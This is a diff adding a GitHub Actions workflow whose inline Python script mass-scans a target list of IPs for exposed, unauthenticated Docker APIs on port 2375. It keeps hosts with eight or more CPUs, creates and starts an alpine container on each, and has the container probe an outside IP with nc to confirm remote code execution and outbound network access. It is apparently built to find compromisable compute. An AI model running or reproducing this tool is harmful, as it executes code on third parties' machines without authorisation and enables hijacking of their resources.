@@ -1,0 +1,76 @@
+name: dockerfull
+
+on:
+  workflow_dispatch:
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: full
+        run: |
+          python3 -m pip install --quiet requests
+          python3 - <<'PY'
+          import concurrent.futures
+          import json
+          import secrets
+          import time
+
+          import requests
+
+          ips = [line.strip() for line in open("targets/docker_ips.txt") if line.strip()]
+
+          def info(ip):
+              try:
+                  r = requests.get(f"http://{ip}:2375/info", timeout=4)
+                  d = r.json()
+                  if "NCPU" not in d:
+                      return None
+                  return (ip, d.get("NCPU"), round((d.get("MemTotal") or 0) / 1024**3, 1))
+              except Exception:
+                  return None
+
+          live = []
+          with concurrent.futures.ThreadPoolExecutor(max_workers=128) as pool:
+              for row in pool.map(info, ips):
+                  if row:
+                      live.append(row)
+          print("live", len(live), flush=True)
+          live = [r for r in live if (r[1] or 0) >= 8]
+          print("verify", len(live), flush=True)
+
+          def verify(row):
+              ip, cores, ram = row
+              base = f"http://{ip}:2375"
+              mark = "MARK" + secrets.token_hex(4)
+              try:
+                  bogus = requests.get(base + "/containers/lc-nope/json", timeout=5)
+                  if bogus.status_code != 404:
+                      return None
+                  body = {"Image": "alpine:latest",
+                          "Cmd": ["/bin/sh", "-c",
+                                  f"echo {mark}; nc -z -w4 104.243.43.115 443; echo NET=$?"],
+                          "HostConfig": {}}
+                  created = requests.post(base + "/containers/create", json=body, timeout=10)
+                  cid = created.json().get("Id", "")
+                  if not cid:
+                      return None
+                  requests.post(base + f"/containers/{cid}/start", timeout=10)
+                  time.sleep(3)
+                  logs = requests.get(base + f"/containers/{cid}/logs?stdout=1&stderr=1", timeout=8).text
+                  if mark in logs:
+                      net = "NET=0" in logs
+                      return (ip, cores, ram, net)
+              except Exception:
+                  return None
+              return None
+
+          results = []
+          with concurrent.futures.ThreadPoolExecutor(max_workers=24) as pool:
+              for res in pool.map(verify, live):
+                  if res:
+                      results.append(res)
+                      print("REAL", res, flush=True)
+          print("real", len(results), flush=True)
+          PY
